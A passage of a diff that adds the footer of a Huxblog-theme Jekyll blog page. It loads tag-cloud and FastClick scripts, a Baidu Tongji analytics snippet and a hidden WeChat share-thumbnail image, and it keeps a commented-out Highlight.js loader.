+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
